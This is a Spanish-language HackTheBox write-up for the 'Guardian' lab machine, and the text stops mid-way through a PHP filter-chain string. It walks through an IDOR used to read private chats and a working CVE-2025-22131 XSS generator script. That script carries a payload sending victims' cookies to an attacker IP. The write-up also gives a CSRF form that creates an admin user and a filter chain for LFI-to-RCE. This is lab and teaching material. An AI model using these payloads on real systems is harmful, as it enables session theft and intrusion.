---
title: Guardian - Hard (HTB)
permalink: /Guardian-HTB-Writeup/
tags:
  - Linux
  - Hard
  - "Information Leakage"
  - IDOR
  - XSS
  - CVE-2025-22131
  - PhpSpreadSheet
  - CSRF
  - RCE
  - "LFI to RCE"
  - "PHP Filters Chain"
  - MySQL
  - "Hash Cracking"
  - Sudoers
  - "Custom Python Script"
  - apache2ctl
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Guardian - Hard (HTB)
seo_description: Cómo las credenciales por defecto y una configuración insegura pueden comprometer totalmente un sitio web y el servidor subyacente.
excerpt: Cómo las credenciales por defecto y una configuración insegura pueden comprometer totalmente un sitio web y el servidor subyacente.
header:
  overlay_image: /assets/images/headers/guardian-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/guardian-hackthebox.jpg
---
![image-center](/assets/images/posts/guardian-hackthebox.png)
{: .align-center}

**Habilidades:** Information Leakage, Insecure Direct Object References (IDOR), `Gitea` Repository Enumeration, CVE-2025-22131 - Cross-Site Scripting in `PhpSpreadSheet`, Cross-Site Request Forgery (CSRF), Remote Code Execution via PHP Filters Chain, System Enumeration, `MySQL` Database Enumeration, Hash Cracking, Abusing Sudoers Privileges - Custom Python Script, Abusing Sudoers Privileges - Custom `apache2ctl` Wrapper
{: .notice--primary}

# Introducción

Guardian es una máquina Linux de Dificultad `Hard` en HackTheBox en la que debemos explotar un sitio web combinando varias técnicas de explotación web, tales como: IDOR, CSRF, CVE-2025-22131 (XSS en `PHP SpreadSheet`)y RCE mediante `PHP Filters Chain` para ganar acceso inicial.

Una vez dentro del sistema, conseguiremos credenciales a través de registros en la base de datos MySQL del servidor, para posteriormente abusar de privilegios configiurados con `sudo` en dos ocasiones: permisos de escritura sobre un script de Python y abuso de vulnerabilidades en un `wrapper` del binario `apache2ctl` para obtener privilegios elevados en el sistema.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

``` bash
ping -c1 10.129.237.248                    
PING 10.129.237.248 (10.129.237.248): 56 data bytes
64 bytes from 10.129.237.248: icmp_seq=0 ttl=63 time=144.712 ms

--- 10.129.237.248 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 144.712/144.712/144.712/0.000 ms
```


## Port Scanning 

Comenzaremos realizando un escaneo de puertos que intente descubrir servicios expuestos en la máquina víctima. Este escaneo será a través del protocolo TCP/IPv4

``` bash
rustscan -a 10.129.237.248 --ulimit 5000 -- -sC -sV -Pn -n -oN services
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports like it's my full-time job. Wait, it is.

[~] The config file is expected to be at "/Users/andrees/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.237.248:22
Open 10.129.237.248:80

<SNIP>


Nmap scan report for 10.129.237.248
Host is up, received user-set (0.20s latency).
Scanned at 2026-02-23 00:54:32 -03 for 20s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9c:69:53:e1:38:3b:de:cd:42:0a:c8:6b:f8:95:b3:62 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEtPLvoTptmr4MsrtI0K/4A73jlDROsZk5pUpkv1rb2VUfEDKmiArBppPYZhUo+Fopcqr4j90edXV+4Usda76kI=
|   256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHTkehIuVT04tJc00jcFVYdmQYDY3RuiImpFenWc9Yi6
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://guardian.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:54
Completed NSE at 00:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:54
Completed NSE at 00:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:54
Completed NSE at 00:54, 0.00s elapsed
Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.59 seconds
```

> Considera usar este tipo de escaneos con `rustscan` exclusivamente en entornos de CTFs, para otros entornos revisa la siguiente advertencia publicada en [`Github`](https://github.com/bee-san/RustScan/wiki/Usage#%EF%B8%8F-warning).
{: .notice--warning}

- `--ulimit 5000`: Acelera el escaneo incrementando el descriptor de archivo.
- `-sC`: Lanzar scripts de reconocimiento más comunes.
- `-sV`: Intentar identificar la versión del servicio que ejecuta el puerto.
- `-Pn`: Omitir descubrimiento de host (`ARP Scan`).
- `-n`: Omitir la resolución `DNS`.
- `-oN`: Exportar en formato normal, tal como se ve por consola.

Solamente vemos dos servicios, puerto `22` (`ssh`) y un servicio web (`http`). Por la versión de ambos podemos descartar vulnerabilidades explotables para este contexto


## Web Enumeration

El servidor web nos intenta aplicar una redirección hacia `guardian.htb`. Agregaremos este nombre de dominio a nuestro archivo `/etc/hosts` para aplicar resolución `DNS` hacia la dirección IP de la máquina

``` bash
echo '10.129.237.248 guardian.htb' | sudo tee -a /etc/hosts
10.129.237.248 guardian.htb
```

Si navegamos hasta `guardian.htb`, veremos la siguiente web, que parece ser de una universidad

![image-center](/assets/images/posts/guardian-1-hackthebox.png)
{: .align-center}


### Student Portal Analysis - `portal.guardian.htb`

En la esquina superior derecha, veremos el botón `Student Portal`, el cual nos redirige a un portal de estudiantes bajo el subdominio `portal.guardian.htb`.

Agregaremos este subdominio a nuestro archivo `/etc/hosts` para poder navegar hasta la plataforma web

``` bash
sudo sed -i 's/guardian.htb$/& portal.guardian.htb/g' /etc/hosts
```

Si ahora visitamos `portal.guardian.htb`, veremos la siguiente web para iniciar sesión

![image-center](/assets/images/posts/guardian-2-hackthebox.png)
{: .align-center}

Durante unos segundos, en la esquina superior derecha veremos el siguiente mensaje que contiene un enlace llamado `Portal Guide`

![image-center](/assets/images/posts/guardian-3-hackthebox.png)
{: .align-center}

Se trata de una guía sobre el uso del portal en un archivo `pdf`. Se muestran las credenciales para iniciar sesión por defecto, las cuales son `GU1234`

![image-center](/assets/images/posts/guardian-4-hackthebox.png)
{: .align-center}

### Web Session as `Boone Basden`

En la web principal podemos ver información sobre usuarios del portal, con sus respectivos nombres de usuario. 

El portal nos permitirá iniciar sesión como el usuario `Boone Basden`

![image-center](/assets/images/posts/guardian-5-hackthebox.png)
{: .align-center}

Iniciando sesión con las credenciales `GU0142023`:`GU1234`, accederemos al portal de estudiantes

![image-center](/assets/images/posts/guardian-6-hackthebox.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## Insecure Direct Object Reference (IDOR)

Si ponemos atención en la URL al momento de consultar chats, veremos cómo se referencia a los usuarios mediante `2` parámetros.

![image-center](/assets/images/posts/guardian-7-hackthebox.png)
{: .align-center}

Esto claramente es una mala práctica, porque podríamos intentar hacer `fuzzing` a estos parámetros para descubrir más chats y quizás ver conversaciones entre otros usuarios.

Al iniciar un nuevo chat con el usuario `admin`, veremos que su `id` se refleja en la URL como `1`

``` http
http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=1
```

- `1` es el usuario `admin`.
- `13` es el usuario actual (`GU0142023`).

### Fuzzing

Realizaremos `fuzzing` al parámetros que identifica a uno los usuarios, de esta forma enumeraremos las conversaciones que los usuarios tuvieron con el usuario `admin`. 

Primeramente podemos crear un diccionario con una secuencia de números

``` bash
seq 1 99 > nums.txt # Crear una secuencia del 1 al 99
```

Una vez hayamos creado la secuencia, la utilizaremos a modo de aplicar `fuzzing` con herramientas como `fuff`, donde necesitamos fuzzear por alguno de los valores del array `chat_users`.

> Solamente estamos haciendo fuerza bruta a un parámetro porque `chat_users[x]=1` representa al usuario `admin`, lo que necesitamos es ver las conversaciones que hay entre él y `x` usuario.
{: .notice--danger}

``` bash
ffuf -c -fl 164 -w nums.txt -b 'PHPSESSID=ali1vr4fmk5ne41df00nb8eh4n' -u 'http://portal.guardian.htb/student/chat.php?chat_users[0]=FUZZ&chat_users[1]=1'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://portal.guardian.htb/student/chat.php?chat_users[0]=FUZZ&chat_users[1]=1
 :: Wordlist         : FUZZ: /Users/andrees/machines/htb/guardian/exploits/nums.txt
 :: Header           : Cookie: PHPSESSID=lmkd9l1ui3vk8fbgulso55986o
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 164
________________________________________________

4                       [Status: 200, Size: 6796, Words: 2763, Lines: 178, Duration: 219ms]
3                       [Status: 200, Size: 6838, Words: 2768, Lines: 178, Duration: 441ms]
2                       [Status: 200, Size: 7306, Words: 3055, Lines: 185, Duration: 3697ms]
:: Progress: [99/99] :: Job [1/1] :: 21 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

- `-fl 164`: Si lanzas un curl a una conversación y aplicas `| wc -l`, notarás que ves `163` líneas, en este caso agregamos una más por el salto del final.

### Chat

Al leer la conversación de `admin` (`ID 1`) con el `ID 2`, lograremos los mensajes que `admin` le envió al usuario `jamil.enockson`

``` http
http://portal.guardian.htb/student/chat.php?chat_users[0]=2&chat_users[1]=1
```

Primero le pregunta como va todo hoy y luego le comparte una contraseña diciendo que corresponde a la plataforma `Gitea`

![image-center](/assets/images/posts/guardian-8-hackthebox.png)
{: .align-center}

### `gitea.guardian.htb`

Intentando enumerar el subdominio `gitea.guardian.htb` forzando la cabecera `Host`, veremos que la plataforma `Gitea` responde correctamente solicitudes

``` bash
curl -si 'http://guardian.htb' -H 'Host: gitea.guardian.htb' | head

HTTP/1.1 200 OK
Date: Mon, 05 Jan 2026 02:37:37 GMT
Server: Apache/2.4.52 (Ubuntu)
Cache-Control: max-age=0, private, must-revalidate, no-transform
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Set-Cookie: i_like_gitea=13b9c6b0777a1772; Path=/; HttpOnly; SameSite=Lax
Set-Cookie: _csrf=eOuihAZUjNo-Hum-QGYjWOPtlBU6MTc2NzU4MDY1NzExNzUxOTA4OQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
Vary: Accept-Encoding
Transfer-Encoding: chunked
```

Agregaremos este subdominio a nuestro archivo `/etc/hosts` para poder alcanzar la plataforma `Gitea`

``` bash
sudo sed -i 's/guardian.htb$/& gitea.guardian.htb/g' /etc/hosts
```

Podemos acceder con las credenciales que vimos en la conversación anterior `jamil.enockson@guardian.htb`:`DHsNnk3V503`

![image-center](/assets/images/posts/guardian-9-hackthebox.png)
{: .align-center}


## `Gitea` Repository Enumeration

Al iniciar sesión en la plataforma `gitea`, veremos dos repositorios existentes, `guadrian.htb` y `portal.guardian.htb`

![image-center](/assets/images/posts/guardian-10-hackthebox.png)
{: .align-center}

### PhpSpreadSheet

Inspeccionando el repositorio de `protal.guardian.htb`, veremos la versión de las dependencias de este proyecto en el archivo [`composer.json`](http://gitea.guardian.htb/Guardian/portal.guardian.htb/src/branch/main/composer.json). 

![image-center](/assets/images/posts/guardian-11-hackthebox.png)
{: .align-center}

Buscando por vulnerabilidades asociadas a esta versión de `phpspreadsheet`, encontraremos algunos CVE que podemos revisar

![image-center](/assets/images/posts/guardian-12-hackthebox.png)
{: .align-center}

### Database Credentials

Además, veremos credenciales para supuestamente conectarnos a la base de datos en el archivo `config/config.php`

``` php
<?php
return [
    'db' => [
        'dsn' => 'mysql:host=localhost;dbname=guardiandb',
        'username' => 'root',
        'password' => 'Gu4rd14n_un1_1s_th3_b3st',
        'options' => []
    ],
    'salt' => '8Sb)tM1vs1SS'
];
```


## CVE-2025-22131 - Cross-Site Scripting (XSS) in `PhpSpreadsheet`

> `PhpSpreadsheet` es una biblioteca escrita en `PHP` puro, que ofrece un conjunto de clases que le permiten leer y escribir varios formatos de archivos de hojas de cálculo como `Excel` y `LibreOffice Calc`.
{: .notice--info}

CVE-2025-22131 es una vulnerabilidad que afecta a varias versiones de `PhpSpreadSheet`, incluyendo `3.0.0-3.8.0`, `1.x` anterior a `1.29.8`, `2.0.0-2.1.7` y `2.2.0-2.3.6`.

El fallo reside en en el código que traduce archivos `XLSX` a una representación `HTML` y afecta específicamente a la función [`generateNavigation()`](https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx) ([`wiz.io`](https://www.wiz.io/vulnerability-database/cve/cve-2025-22131)).

### Understanding Vulnerability

Al generar el `HTML` a partir de un archivo `XLSX` que contiene varias hojas, se crea un menú de navegación.

Este menú incluye el título de las hojas, los cuales no están sanitizados. Un atacante puede explotar este fallo para ejecutar código `javascript` a través de un nombre de hoja de cálculo malicioso.

El siguiente código se encarga de construir el `HTML`, donde se obtiene el nombre de la hoja de cálculo a través de `$sheet->getTitle()`

``` html
        // Construct HTML
        $html = '';

        // Only if there are more than 1 sheets
        if (count($sheets) > 1) {
            // Loop all sheets
            $sheetId = 0;

            $html .= '<ul class="navigation">' . PHP_EOL;

            foreach ($sheets as $sheet) {
                $html .= '  <li class="sheet' . $sheetId . '"><a href="#sheet' . $sheetId . '">' . $sheet->getTitle() . '</a></li>' . PHP_EOL;
                ++$sheetId;
            }

            $html .= '</ul>' . PHP_EOL;
        }
```

### File Upload

Desde la web `portal.guardian.htb`, en la sección `Assignments` veremos una asignación pendiente

![image-center](/assets/images/posts/guardian-13-hackthebox.png)
{: .align-center}

Desde la cual podremos subir documentos tanto `.docx` o `xlsx`

![image-center](/assets/images/posts/guardian-14-hackthebox.png)
{: .align-center}

### Exploiting

Para explotar este CVE, generaremos un nuevo archivo `.xlsx`, podemos hacerlo con `python` o desde cualquier editor de hojas de cálculo.

En mi caso generé el siguiente script basándome en la siguiente prueba de concepto compartida por el usuario [`s0ck37`](https://github.com/s0ck37/CVE-2025-22131-POC/)

``` python
import openpyxl
import shutil
import zipfile
import html
import os
import sys

# Create Workbook
def create_xlsx(filename):
    try:
        workbook = openpyxl.Workbook()
        sheet1 = workbook.active
        sheet1.title = 'Sheet1'

        sheet2 = workbook.create_sheet(title='Sheet2')
        workbook.save(filename)
        return True
    except Exception as e:
        print(f'[!] Error: {e}')
        sys.exit(1)


# Extract .xlsx File
def unzip_xlsx(xlsx_dir, filename):
    try:
        with zipfile.ZipFile(filename, 'r') as xlsx:
            xlsx.extractall(xlsx_dir)
            return True
    except Exception as e:
        print(f'[!] Error: {e}')
        sys.exit(1)


# Inject payload into xlsx file
def inject_payload(xlsx_dir, filename, payload):
    payload = html.escape(payload)

    workbook = open(f"{xlsx_dir}/xl/workbook.xml","rt")
    workbook_content = workbook.read()
    workbook.close()
    
    workbook = open(f"{xlsx_dir}/xl/workbook.xml","wt")
    workbook.write(workbook_content.replace("Sheet2", payload))
    workbook.close()
    
    try:
        outxlsx = zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED)
        
        for root, dirs, files in os.walk(xlsx_dir):
            for file in files:
                full_path = os.path.join(root, file)
                relative_path = os.path.relpath(full_path, xlsx_dir)
                outxlsx.write(full_path, arcname=relative_path)
        
        shutil.rmtree(xlsx_dir)
        return True
    except Exception as e:
        print(f'[!] Error: {e}')
        sys.exit(1)


def main():
    if len(sys.argv) == 3:
        filename = sys.argv[1]
        payload = sys.argv[2]
    else:
        print("[?] Usage: poc.py <xlsx_filename> <xss_payload>")
        sys.exit(1)
    
    xlsx_dir = '.unzipped_xlsx'
    
    print('[*] Creating XLSX File...')
    if create_xlsx(filename):
        print('[+] Sample .xlsx file was created successfully!')

    print('[*] Embedding injection')
    unzip_xlsx(xlsx_dir, filename)

    print('[*] Crating final xlsx')
    if inject_payload(xlsx_dir, filename, payload):
        print('[+] Payload injected, send it to the victim')


# Main
if __name__ == "__main__":
    main()
```

Podemos preparar un entorno virtual con `python venv` o el gestor de paquetes `uv`

``` bash
python3 -m venv .venv
source .venv/bin/activate
uv pip install openpyxl
```

Ejecutaremos el script de la siguiente forma, pasando el nombre del nuevo archivo `.xlsx` y el `payload`

``` bash
python3 generate_xlsx.py poc.xlsx "<img src=x onerror=\"document.location='http://10.10.16.8/?cookie='+document.cookie\">"
[*] Creating XLSX File...
[+] Sample .xlsx file was created successfully!
[*] Embedding injection
[*] Crating final xlsx
[+] Payload injected, send it to the victim   
```

> Opcionalmente y a modo de verificar el payload, si descomprimimos `poc.xlsx` y miramos el archivo `workbook.xml`, notaremos que en la segunda hoja de cálculo hemos incrustado el payload como nombre
{: .notice}

``` xml
<workbook xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><workbookPr /><workbookProtection /><bookViews><workbookView visibility="visible" minimized="0" showHorizontalScroll="1" showVerticalScroll="1" showSheetTabs="1" tabRatio="600" firstSheet="0" activeTab="0" autoFilterDateGrouping="1" /></bookViews><sheets><sheet name="Sheet1" sheetId="1" state="visible" r:id="rId1" /><sheet name="&lt;img src=x onerror=&quot;document.location=&#x27;http://10.10.16.8/?cookie=&#x27;+document.cookie&quot;&gt;" sheetId="2" state="visible" r:id="rId2" /></sheets><definedNames /><calcPr calcId="124519" fullCalcOnLoad="1" /></workbook>
```

Antes de enviar el exploit iniciaremos un servidor `HTTP` con `python`, el cual recibirá la conexión desde la máquina víctima

``` bash
python3 -m http.server 80
```

Subiremos este archivo malicioso a través del `Assingment` que tenemos disponible subir archivos

![image-center](/assets/images/posts/guardian-15-hackthebox.png)
{: .align-center}

Al enviar el archivo, recibiremos una solicitud `HTTP` en nuestro servidor que contiene una cookie de sesión

``` bash
10.129.237.248 - - [28/Feb/2026 12:32:00] "GET /?cookie=PHPSESSID=r349knev6qq291ienhd3aodbn3 HTTP/1.1" 200 -
```

Modificaremos la `cookie` desde las `DevTools` > `Storage` > `Cookies` para ahora apoderarnos de la cuenta que ha revisado nuestro `Assignment`

![image-center](/assets/images/posts/guardian-16-hackthebox.png)
{: .align-center}


## Web Access as `sammy.treat`

Ahora cuando recarguemos la web o vayamos a `Dashboard`, tendremos una sesión como el usuario `sammy.treat`. 

Concretamente este usuario posee un rol `lecturer` dentro de la plataforma, no de administración

![image-center](/assets/images/posts/guardian-17-hackthebox.png)
{: .align-center}


## Cross-Site Request Forgery (CSRF)

> La falsificación de solicitudes entre sitios (`Cross-Site Request Forgery`, o `CSRF`) es una vulnerabilidad de seguridad web que permite a un atacante inducir a los usuarios a realizar acciones que no desean.
> 
> Permite a un atacante eludir la política `Same Origin Policy`, diseñada para evitar que diferentes sitios web interfieran entre sí ([`PortSwigger`](https://portswigger.net/web-security/csrf)).
{: .notice--info}

### Notice Board

La sección `Notice Board` nos permite enviar avisos a la comunidad, al ingresar veremos un formulario donde podemos especificar un título, un cuerpo y además un enlace, el cual será revisado por un administrador.

Enviaremos un aviso a través del formulario, donde aprovecharemos el campo `Reference Link` para enviar al administrador hacia un servidor que controlemos

![image-center](/assets/images/posts/guardian-18-hackthebox.png)
{: .align-center}

Al crear el aviso, en unos pocos segundos deberíamos ver una solicitud `HTTP` en nuestro servidor

``` bash
10.129.237.248 - - [28/Feb/2026 15:13:35] "GET / HTTP/1.1" 200 -
10.129.237.248 - - [28/Feb/2026 15:13:35] code 404, message File not found
10.129.237.248 - - [28/Feb/2026 15:13:35] "GET /favicon.ico HTTP/1.1" 404 -
```

Perfecto, ahora solo debemos pensar en abusar de esto para que el administrador nos conceda acceso de alguna forma

### Source Code Analysis

Analizando el repositorio, en la ruta `admin` veremos el siguiente archivo que hace alusión a crear un usuario.

Podríamos intentar abusar de esta funcionalidad para ganar acceso a la plataforma

![image-center](/assets/images/posts/guardian-19-hackthebox.png)
{: .align-center}

Desde la línea `28` del archivo `createuser.php`, veremos los datos que el servidor necesita para crear un nuevo usuario en la plataforma `portal`

``` php
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $full_name = $_POST['full_name'] ?? '';
    $email = $_POST['email'] ?? '';
    $dob = $_POST['dob'] ?? '';
    $address = $_POST['address'] ?? '';
    $user_role = $_POST['user_role'] ?? '';
```

Como podemos especificar un rol para el nuevo usuario, podríamos intentar asignar el rol `admin` (como podemos ver en uno de los formularios en el mismo archivo `createuser.php`)

``` php
<select name="user_role" required 
	class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-indigo-500 focus:ring-indigo-500">
     <option value="student">Student</option>
     <option value="lecturer">Lecturer</option>
     <option value="admin">Admin</option>
</select>
```

### Exploiting

Recordemos que tenemos la capacidad de que un administrador de la plataforma visite nuestro enlace, por lo que también podemos obligarlo a que realice solicitudes de forma automática.

El siguiente formulario `HTML` intenta generar un nuevo usuario enviando todos los datos necesarios por `POST` hacia ese endpoint `PHP`

``` html
<form id="autosubmit" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
 <input name="username" type="hidden" value="incommatose" />
 <input name="password" type="hidden" value="test123" />
 <input name="full_name" type="hidden" value="Evil User" />
 <input name="email" type="hidden" value="test@test.com" />
 <input name="dob" type="hidden" value="2000-01-01" />
 <input name="address" type="hidden" value="Fake St. 123" />
 <input name="user_role" type="hidden" value="admin" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```

Este formulario no funcionará por sí solo, y es que el servidor valida la legitimidad de las solicitudes web a través de un token anti `CSRF`.

> Un token `CSRF` (`CSRF Token`) es un valor único, secreto e impredecible generado por la aplicación del servidor y compartido con el cliente. 
> 
> Al intentar realizar una acción confidencial, como enviar un formulario, el cliente debe incluir el token `CSRF` correcto en la solicitud. Esto dificulta enormemente que un atacante cree una solicitud válida en nombre de la víctima ([`PortSwigger`](https://portswigger.net/web-security/csrf)).
{: .notice--info}

Aunque exista esta protección, podemos hacer `bypass` de ella enviando un token extraído de una solicitud normal reciente. 

> Podemos interceptar cualquier solicitud `POST`, como la que acabamos de hacer al enviar un nuevo aviso.
{: .notice--danger}

![image-center](/assets/images/posts/guardian-20-hackthebox.png)
{: .align-center}

De forma que el formulario final que enviaremos será el siguiente, añadiendo el campo `csrf_token`

``` html
<form id="autosubmit" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
 <input name="username" type="hidden" value="incommatose" />
 <input name="password" type="hidden" value="test123" />
 <input name="full_name" type="hidden" value="Evil User" />
 <input name="email" type="hidden" value="test@test.com" />
 <input name="dob" type="hidden" value="2000-01-01" />
 <input name="address" type="hidden" value="Fake St. 123" />
 <input name="user_role" type="hidden" value="admin" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```

En el campo `reference_link`, especificaremos el nombre de nuestro archivo malicioso, en este caso lo llamé `exploit.html`

![image-center](/assets/images/posts/guardian-21-hackthebox.png)
{: .align-center}

Al cabo de unos momentos recibiremos una solicitud `HTTP` hacia el archivo `exploit.html`

``` bash
10.129.237.248 - - [28/Feb/2026 15:58:18] "GET /exploit.html HTTP/1.1" 200 -
```


## Web Administration Access

Ahora intentaremos acceder a la web como nuestro nuevo usuario

![image-center](/assets/images/posts/guardian-22-hackthebox.png)
{: .align-center}

Se cargará la interfaz administrativa bajo la ruta `/admin/dashboard.php`

![image-center](/assets/images/posts/guardian-23-hackthebox.png)
{: .align-center}


## RCE via PHP Filters Chain

> La técnica de filtros `PHP` es un método de explotación que encadena varios filtros de flujo `PHP` (también conocidos como `PHP Streams`, usando `php://filter`) para transformar el contenido de un archivo.
> 
> Comúnmente esta técnica es utilizada para eludir filtros en servidores web `PHP` buscando la ejecución remota de código (`RCE`) a través de vulnerabilidades de `Local File Inclusion` (`LFI`).
{: .notice--info}

En la siguiente publicación de [`synacktiv`](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it) podemos encontrar un análisis técnico más detallado del funcionamiento de esta técnica.

### Source Code Analysis

Concentremos nuestra atención en las primeras líneas de código `PHP` del archivo `admin/reports.php`

``` php
<?php
require '../includes/auth.php';
require '../config/db.php';

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$report = $_GET['report'] ?? 'reports/academic.php';

if (strpos($report, '..') !== false) {
    die("<h2>Malicious request blocked 🚫 </h2>");
}   

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("<h2>Access denied. Invalid file 🚫</h2>");
}

?>
```

Esta página web permite ver reportes usando el parámetro `report`, el cual aplica algunos filtros contra `LFI`, como el uso de `strpos()` y una función regular para que solamente las cadenas `enrollment`, `academic`, `financial`, y `system` sean permitidas con la extensión `.php`.

Más abajo en la línea `75`, notaremos que el servidor carga el contenido de la variable `$report` a través de la función `include()`

``` html
            </div>
           
            <?php include($report); ?>
            
        </div>
```

Si intentamos algunas pruebas como simplemente recorrer directorios hacia atrás, veremos el siguiente error, es parte de las protecciones que el servidor emplea

![image-center](/assets/images/posts/guardian-24-hackthebox.png)
{: .align-center}

Al igual que si intentamos llamar a un archivo que no existe, saldrá un error similar porque la expresión regular nos limita

![image-center](/assets/images/posts/guardian-25-hackthebox.png)
{: .align-center}

### Exploiting

Utilizaremos la siguiente [prueba de concepto]() para generar una cadena de filtros que podamos utilizar para ejecutar código `PHP`.

> A modo de prueba, podemos ejecutar un comando a nivel de sistema trazable, como `id`, el cual debería mostrar su salida dentro de la web.
{: .notice--warning}

``` bash
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator

uv run php_filter_chain_generator.py --chain '<?php system("id"); ?>'
[+] The following gadget chain will generate the following code : <?php system("id"); ?> (base64 value: PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK